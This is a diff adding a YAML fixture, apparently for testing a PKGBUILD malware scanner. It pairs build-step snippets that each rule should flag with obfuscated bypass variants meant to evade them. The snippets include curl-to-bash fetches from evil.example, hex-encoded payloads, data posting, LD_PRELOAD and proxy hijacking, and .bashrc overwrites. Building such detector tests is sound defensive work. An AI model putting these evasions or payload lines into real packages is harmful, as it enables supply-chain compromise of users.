@@ -1,0 +1,225 @@
+cells:
+- id: X001-control
+  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -10,6 +10,8 @@\n \n build() {\n     :\n+    printf '\\x65\\x63\\x68\\x6f\\x20\\x65\\x76\\x69\\x6c' | bash\n+    python3 -c 'import urllib.request as u; u.urlopen(\"http://evil.example/x\")'\n }\n \n package() {\n"
+  expect_fire:
+  - X001
+- id: X001-bypass
+  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -7,9 +7,14 @@\n license=('MIT')\n source=(\"https://example.com/probe-1.0.0.tar.gz\")\n sha256sums=('SKIP')\n+_p='\\x63\\x75\\x72\\x6c\\x20\\x2d\\x73\\x20\\x68\\x74\\x74\\x70\\x3a\\x2f\\x2f\\x65\\x76\\x69\\x6c\\x2e\\x65\\x78\\x61\\x6d\\x70\\x6c\\x65'\n+_py='import urllib.request as u; u.urlopen(\"http://evil.example/x\")'\n+\n \n build() {\n     :\n+    printf '%b' \"$_p\" | bash\n+    python3 -c \"$_py\"\n }\n \n package() {\n"
+  expect_absent:
+  - X001
+- id: X010-control
+  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -10,6 +10,8 @@\n \n build() {\n     :\n+    printf '\\x65\\x63\\x68\\x6f\\x20\\x65\\x76\\x69\\x6c' | bash\n+    python3 -c 'import urllib.request as u; u.urlopen(\"http://evil.example/x\")'\n }\n \n package() {\n"
+  expect_fire:
+  - X010
+- id: X010-bypass
+  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -7,9 +7,14 @@\n license=('MIT')\n source=(\"https://example.com/probe-1.0.0.tar.gz\")\n sha256sums=('SKIP')\n+_p='\\x63\\x75\\x72\\x6c\\x20\\x2d\\x73\\x20\\x68\\x74\\x74\\x70\\x3a\\x2f\\x2f\\x65\\x76\\x69\\x6c\\x2e\\x65\\x78\\x61\\x6d\\x70\\x6c\\x65'\n+_py='import urllib.request as u; u.urlopen(\"http://evil.example/x\")'\n+\n \n build() {\n     :\n+    printf '%b' \"$_p\" | bash\n+    python3 -c \"$_py\"\n }\n \n package() {\n"
+  expect_absent:
+  - X010
+- id: X011-control
+  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -15,3 +15,7 @@\n package() {\n     install -Dm644 \"$srcdir/probe.txt\" \"$pkgdir/usr/share/probe/probe.txt\"\n }\n+\n+post_install() {\n+    npm install evil\n+}\n"
+  expect_fire:
+  - X011
+- id: X011-bypass
+  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -7,9 +7,13 @@\n license=('MIT')\n source=(\"https://example.com/probe-1.0.0.tar.gz\")\n sha256sums=('SKIP')\n+_m=npm\n+\n \n build() {\n     :\n+    \"$_m\" install evil\n+    curl\"\" -fsSL https://evil.example/x | bash\n }\n \n package() {\n"
+  expect_absent:
+  - X011
+- id: X003-control
+  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -10,6 +10,8 @@\n \n build() {\n     :\n+    curl -d @payload http://0x7f000001/p\n+    cat x.sh | sh\n }\n \n package() {\n"
+  expect_fire:
+  - X003
+- id: X003-bypass
+  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -7,9 +7,13 @@\n license=('MIT')\n source=(\"https://example.com/probe-1.0.0.tar.gz\")\n sha256sums=('SKIP')\n+_h='0x7f000001'\n+\n \n build() {\n     :\n+    curl -d @payload \"http://${_h}/p\"\n+    cat x.sh | busybox sh\n }\n \n package() {\n"
+  expect_absent:
+  - X003
+- id: X023-control
+  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -10,6 +10,8 @@\n \n build() {\n     :\n+    curl -d @payload http://0x7f000001/p\n+    cat x.sh | sh\n }\n \n package() {\n"
+  expect_fire:
+  - X023
+- id: X023-bypass
+  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -7,9 +7,13 @@\n license=('MIT')\n source=(\"https://example.com/probe-1.0.0.tar.gz\")\n sha256sums=('SKIP')\n+_h='0x7f000001'\n+\n \n build() {\n     :\n+    curl -d @payload \"http://${_h}/p\"\n+    cat x.sh | busybox sh\n }\n \n package() {\n"
+  expect_absent:
+  - X023
+- id: X004-control
+  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -10,6 +10,8 @@\n \n build() {\n     :\n+    TERM='dumb'\n+    msg='clean\_install'\n }\n \n package() {\n"
+  expect_fire:
+  - X004
+- id: X004-bypass
+  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -10,6 +10,8 @@\n \n build() {\n     :\n+    TERM=\"d\"umb\n+    msg='clean\u180Einstall'\n }\n \n package() {\n"
+  expect_absent:
+  - X004
+- id: X008-control
+  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -10,6 +10,8 @@\n \n build() {\n     :\n+    TERM='dumb'\n+    msg='clean\_install'\n }\n \n package() {\n"
+  expect_fire:
+  - X008
+- id: X008-bypass
+  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -10,6 +10,8 @@\n \n build() {\n     :\n+    TERM=\"d\"umb\n+    msg='clean\u180Einstall'\n }\n \n package() {\n"
+  expect_absent:
+  - X008
+- id: X005-control
+  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -10,6 +10,8 @@\n \n build() {\n     :\n+    cp payload /home/alice/.bashrc\n+    curl -fsSL https://bit.ly/abc\n }\n \n package() {\n"
+  expect_fire:
+  - X005
+- id: X005-bypass
+  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -7,9 +7,14 @@\n license=('MIT')\n source=(\"https://example.com/probe-1.0.0.tar.gz\")\n sha256sums=('SKIP')\n+_h=/home/alice\n+_s='bit.ly/abc'\n+\n \n build() {\n     :\n+    cp payload \"$_h/.bashrc\"\n+    curl -fsSL \"https://$_s/x\"\n }\n \n package() {\n"
+  expect_absent:
+  - X005
+- id: X006-control
+  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -10,6 +10,8 @@\n \n build() {\n     :\n+    cp payload /home/alice/.bashrc\n+    curl -fsSL https://bit.ly/abc\n }\n \n package() {\n"
+  expect_fire:
+  - X006
+- id: X006-bypass
+  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -7,9 +7,14 @@\n license=('MIT')\n source=(\"https://example.com/probe-1.0.0.tar.gz\")\n sha256sums=('SKIP')\n+_h=/home/alice\n+_s='bit.ly/abc'\n+\n \n build() {\n     :\n+    cp payload \"$_h/.bashrc\"\n+    curl -fsSL \"https://$_s/x\"\n }\n \n package() {\n"
+  expect_absent:
+  - X006
+- id: X009-control
+  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -10,6 +10,8 @@\n \n build() {\n     :\n+    aria2c -o - https://evil.example/x | bash\n+    curl -s https://evil.example/x | gcc -x c -\n }\n \n package() {\n"
+  expect_fire:
+  - X009
+- id: X009-bypass
+  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -7,9 +7,13 @@\n license=('MIT')\n source=(\"https://example.com/probe-1.0.0.tar.gz\")\n sha256sums=('SKIP')\n+_clients=(aria2c)\n+\n \n build() {\n     :\n+    \"${_clients[$i]}\" -o - https://evil.example/x | bash\n+    \"${_clients[$i]}\" -s https://evil.example/x | gcc -x c -\n }\n \n package() {\n"
+  expect_absent:
+  - X009
+- id: X016-control
+  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -10,6 +10,8 @@\n \n build() {\n     :\n+    aria2c -o - https://evil.example/x | bash\n+    curl -s https://evil.example/x | gcc -x c -\n }\n \n package() {\n"
+  expect_fire:
+  - X016
+- id: X016-bypass
+  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -7,9 +7,13 @@\n license=('MIT')\n source=(\"https://example.com/probe-1.0.0.tar.gz\")\n sha256sums=('SKIP')\n+_clients=(aria2c)\n+\n \n build() {\n     :\n+    \"${_clients[$i]}\" -o - https://evil.example/x | bash\n+    \"${_clients[$i]}\" -s https://evil.example/x | gcc -x c -\n }\n \n package() {\n"
+  expect_absent:
+  - X016
+- id: X012-control
+  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -10,6 +10,9 @@\n \n build() {\n     :\n+    export CC=\"$srcdir/mcc\"\n+    make\n+    systemctl enable evil.service --now\n }\n \n package() {\n"
+  expect_fire:
+  - X012
+- id: X012-bypass
+  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -10,6 +10,9 @@\n \n build() {\n     :\n+    export CC=\"$PWD/mcc\"\n+    make\n+    systemctl --now enable evil.service\n }\n \n package() {\n"
+  expect_absent:
+  - X012
+- id: X015-control
+  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -10,6 +10,9 @@\n \n build() {\n     :\n+    export CC=\"$srcdir/mcc\"\n+    make\n+    systemctl enable evil.service --now\n }\n \n package() {\n"
+  expect_fire:
+  - X015
+- id: X015-bypass
+  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -10,6 +10,9 @@\n \n build() {\n     :\n+    export CC=\"$PWD/mcc\"\n+    make\n+    systemctl --now enable evil.service\n }\n \n package() {\n"
+  expect_absent:
+  - X015
+- id: X013-control
+  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -10,6 +10,8 @@\n \n build() {\n     :\n+    export HTTPS_PROXY=http://evil.example:8080\n+    export LD_PRELOAD=\"$_p\"\n }\n \n package() {\n"
+  expect_fire:
+  - X013
+- id: X013-bypass
+  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -10,6 +10,8 @@\n \n build() {\n     :\n+    printf -v HTTPS_PROXY '%s' 'http://evil.example:8080'\n+    printf -v LD_PRELOAD '%s' \"$_p\"\n }\n \n package() {\n"
+  expect_absent:
+  - X013
+- id: X024-control
+  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -10,6 +10,8 @@\n \n build() {\n     :\n+    export HTTPS_PROXY=http://evil.example:8080\n+    export LD_PRELOAD=\"$_p\"\n }\n \n package() {\n"
+  expect_fire:
+  - X024
+- id: X024-bypass
+  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -10,6 +10,8 @@\n \n build() {\n     :\n+    printf -v HTTPS_PROXY '%s' 'http://evil.example:8080'\n+    printf -v LD_PRELOAD '%s' \"$_p\"\n }\n \n package() {\n"
+  expect_absent:
+  - X024
+- id: X017-control
+  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -10,6 +10,8 @@\n \n build() {\n     :\n+    find . -exec sh -c 'eval true' \\;\n+    bash *.sh\n }\n \n package() {\n"
+  expect_fire:
+  - X017
+- id: X017-bypass
+  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -10,6 +10,8 @@\n \n build() {\n     :\n+    find . -print0 | xargs -0 sh -c 'eval \"$1\"' _ x\n+    bash \"$(ls \"$srcdir/scripts/run.sh\")\"\n }\n \n package() {\n"
+  expect_absent:
+  - X017
+- id: X021-control
+  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -10,6 +10,8 @@\n \n build() {\n     :\n+    find . -exec sh -c 'eval true' \\;\n+    bash *.sh\n }\n \n package() {\n"
+  expect_fire:
+  - X021
+- id: X021-bypass
+  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -10,6 +10,8 @@\n \n build() {\n     :\n+    find . -print0 | xargs -0 sh -c 'eval \"$1\"' _ x\n+    bash \"$(ls \"$srcdir/scripts/run.sh\")\"\n }\n \n package() {\n"
+  expect_absent:
+  - X021
+- id: X018-control
+  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -10,6 +10,8 @@\n \n build() {\n     :\n+    python3 -c 'x=\"sh\"; eval(x)'\n+    hostname > \"$pkgdir/etc/host-id\"\n }\n \n package() {\n"
+  expect_fire:
+  - X018
+- id: X018-bypass
+  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -10,6 +10,8 @@\n \n build() {\n     :\n+    python3 -c 'import os; c=\"sh\"; os.system(c)'\n+    hostname | tee \"$pkgdir/etc/host-id\"\n }\n \n package() {\n"
+  expect_absent:
+  - X018
+- id: X019-control
+  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -10,6 +10,8 @@\n \n build() {\n     :\n+    python3 -c 'x=\"sh\"; eval(x)'\n+    hostname > \"$pkgdir/etc/host-id\"\n }\n \n package() {\n"
+  expect_fire:
+  - X019
+- id: X019-bypass
+  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -10,6 +10,8 @@\n \n build() {\n     :\n+    python3 -c 'import os; c=\"sh\"; os.system(c)'\n+    hostname | tee \"$pkgdir/etc/host-id\"\n }\n \n package() {\n"
+  expect_absent:
+  - X019
+- id: X020-control
+  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -10,6 +10,11 @@\n \n build() {\n     :\n+    cat > Makefile <<'EOF'\n+\tgcc -c evil.c\n+EOF\n+    cat \"$srcdir/x.conf.in\" > x.conf\n+    ./tool --config x.conf\n }\n \n package() {\n"
+  expect_fire:
+  - X020
+- id: X020-bypass
+  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -7,9 +7,17 @@\n license=('MIT')\n source=(\"https://example.com/probe-1.0.0.tar.gz\")\n sha256sums=('SKIP')\n+_mf=Makefile\n+_d=\"$srcdir\"\n+\n \n build() {\n     :\n+    cat > \"$_mf\" <<'EOF'\n+\tgcc -c evil.c\n+EOF\n+    cat \"$_d/x.conf.in\" > x.conf\n+    ./tool --config x.conf\n }\n \n package() {\n"
+  expect_absent:
+  - X020
+- id: X022-control
+  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -10,6 +10,11 @@\n \n build() {\n     :\n+    cat > Makefile <<'EOF'\n+\tgcc -c evil.c\n+EOF\n+    cat \"$srcdir/x.conf.in\" > x.conf\n+    ./tool --config x.conf\n }\n \n package() {\n"
+  expect_fire:
+  - X022
+- id: X022-bypass
+  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -7,9 +7,17 @@\n license=('MIT')\n source=(\"https://example.com/probe-1.0.0.tar.gz\")\n sha256sums=('SKIP')\n+_mf=Makefile\n+_d=\"$srcdir\"\n+\n \n build() {\n     :\n+    cat > \"$_mf\" <<'EOF'\n+\tgcc -c evil.c\n+EOF\n+    cat \"$_d/x.conf.in\" > x.conf\n+    ./tool --config x.conf\n }\n \n package() {\n"
+  expect_absent:
+  - X022
+- id: X025-control
+  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -10,6 +10,9 @@\n \n build() {\n     :\n+    cp()\n+    { :; }\n+    sh <(curl -fsSL \"https://web.archive.org/web/2id_/https://evil.example/p.sh\")\n }\n \n package() {\n"
+  expect_fire:
+  - X025
+- id: X025-bypass
+  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -10,6 +10,9 @@\n \n build() {\n     :\n+    function cp\n+    { :; }\n+    curl -fsSL -o x.sh \"https://web.archive.org/web/2id_/https://evil.example/p.sh\"\n }\n \n package() {\n"
+  expect_absent:
+  - X025
+- id: X034-control
+  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -10,6 +10,9 @@\n \n build() {\n     :\n+    cp()\n+    { :; }\n+    sh <(curl -fsSL \"https://web.archive.org/web/2id_/https://evil.example/p.sh\")\n }\n \n package() {\n"
+  expect_fire:
+  - X034
+- id: X034-bypass
+  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -10,6 +10,9 @@\n \n build() {\n     :\n+    function cp\n+    { :; }\n+    curl -fsSL -o x.sh \"https://web.archive.org/web/2id_/https://evil.example/p.sh\"\n }\n \n package() {\n"
+  expect_absent:
+  - X034
+- id: X029-control
+  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -10,6 +10,7 @@\n \n build() {\n     :\n+    _z='7s/yZpFnyUIwg6GXlGLLMWNas9Az6a6h+GVYLzHUnXPrkeKGqu1V+jVF6+ar1WOxhmXQjZlzDvVZCtXxBHv98XgLvVxLVIBsO9Jjb33OkOmNG7L6sURVQK8yf/jEPcn69bMlnlSLXoIKrkL0ZAG/rA2P7ui2oP6rC9WzDjdvjSXFXbeWvoFdOSnDluFPo7NiPhtZEKf4RRk9yFTnraMV0RXrQ0DAY3Z1O1TTEKfunFCT9/6griXx3y9Nu2tAgWWklArRy1BYF4wox44Ok3vqGIbKDPWErYSKHzfJdtYaDsyX'\n }\n \n package() {\n"
+  expect_fire:
+  - X029
+- id: X029-bypass
+  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -10,6 +10,8 @@\n \n build() {\n     :\n+    _z1='7s/yZpFnyUIwg6GXlGLLMWNas9Az6a6h+GVYLzHUnXPrkeKGqu1V+jVF6+ar1WOxhmXQjZlzDvVZCtXxBHv98XgLvVxLVIBsO9Jjb33OkOmNG7L6sURVQK8yf/jEPcn69bMlnlSLXoIKrkL0ZAG/rA'\n+    _z2='2P7ui2oP6rC9WzDjdvjSXFXbeWvoFdOSnDluFPo7NiPhtZEKf4RRk9yFTnraMV0RXrQ0DAY3Z1O1TTEKfunFCT9/6griXx3y9Nu2tAgWWklArRy1BYF4wox44Ok3vqGIbKDPWErYSKHzfJdtYaDsyX'\n }\n \n package() {\n"
+  expect_absent:
+  - X029
+- id: X030-control
+  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -10,6 +10,7 @@\n \n build() {\n     :\n+    $'\\x73\\x68' -c 'echo hi'\n }\n \n package() {\n"
+  expect_fire:
+  - X030
+- id: X030-bypass
+  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -10,6 +10,7 @@\n \n build() {\n     :\n+    $'\\x73'$'\\x68' -c 'echo hi'\n }\n \n package() {\n"
+  expect_absent:
+  - X030
+- id: X031-control
+  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -10,6 +10,7 @@\n \n build() {\n     :\n+    cat \"$srcdir/PKGBUILD\" | bash\n }\n \n package() {\n"
+  expect_fire:
+  - X031
+- id: X031-bypass
+  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -10,6 +10,7 @@\n \n build() {\n     :\n+    dd if=\"$srcdir/PKGBUILD\" bs=1 2>/dev/null | bash\n }\n \n package() {\n"
+  expect_absent:
+  - X031
+- id: X032-control
+  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -10,6 +10,7 @@\n \n build() {\n     :\n+    curl\"\" -fsSL https://evil.example/x | bash\n }\n \n package() {\n"
+  expect_fire:
+  - X032
+- id: X032-bypass
+  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -7,9 +7,12 @@\n license=('MIT')\n source=(\"https://example.com/probe-1.0.0.tar.gz\")\n sha256sums=('SKIP')\n+_x=u\n+\n \n build() {\n     :\n+    c\"$_x\"rl -fsSL https://evil.example/x | bash\n }\n \n package() {\n"
+  expect_absent:
+  - X032
+- id: X007-control
+  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -10,6 +10,9 @@\n \n build() {\n     :\n+    export CC=\"$srcdir/mcc\"\n+    make\n+    systemctl enable evil.service --now\n }\n \n package() {\n"
+  expect_fire:
+  - X007
+- id: X007-bypass
+  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -10,6 +10,9 @@\n \n build() {\n     :\n+    export CC=\"$PWD/mcc\"\n+    make\n+    systemctl --now enable evil.service\n }\n \n package() {\n"
+  expect_absent:
+  - X007
